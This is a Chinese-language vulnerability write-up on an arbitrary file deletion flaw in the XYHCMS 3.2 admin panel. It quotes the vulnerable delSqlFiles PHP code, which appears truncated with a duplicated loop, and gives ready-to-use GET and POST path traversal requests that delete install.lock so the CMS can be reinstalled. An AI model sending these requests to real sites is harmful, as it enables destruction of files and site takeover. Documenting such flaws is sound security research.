XYHCMS 3.2 后台任意文件删除漏洞
===============================

一、漏洞简介
------------

二、漏洞影响
------------

XYHCMS 3.2

三、复现过程
------------

### 漏洞分析

`/App/Manage/Controller/DatabaseController.class.php`

    //删除sql文件
    public function delSqlFiles() {
      
        $id = I('id', 0, 'intval');
        $batchFlag = I('get.batchFlag', 0, 'intval');
        //批量删除
        if ($batchFlag) {
            $files = I('key', array());
        } else {
            $files[] = I('sqlfilename', '');
        }
      
        if (empty($files)) {
            $this->error('请选择要删除的sql文件');
        }
        foreach ($files as $file) {
            $_ext = pathinfo($file, PATHINFO_EXTENSION);
            //拼接后直接删除
      
        foreach ($files as $file) {
            unlink($this->getDbPath() . '/' . $file);
        }
        $this->success("已删除：" . implode(",", $files), U('Database/restore'));
      
    }

### 漏洞复现

1.  登录后台

2.  删除安装锁文件

    a.  get方式

    -   `http://www.0-sec.org/xyhai.php? s=/Database/delSqlFiles/sqlfilename/..\\..\\..\\install/install.lock`

    b.  post方式

    -   `http://www.0-sec.org/xyhai.php?s=/Database/delSqlFiles/batchFlag/1`

        POST数据：`key[]=../../../install/install.lock`

3.  之后访问 `http://www.0-sec.org/install`重装cms
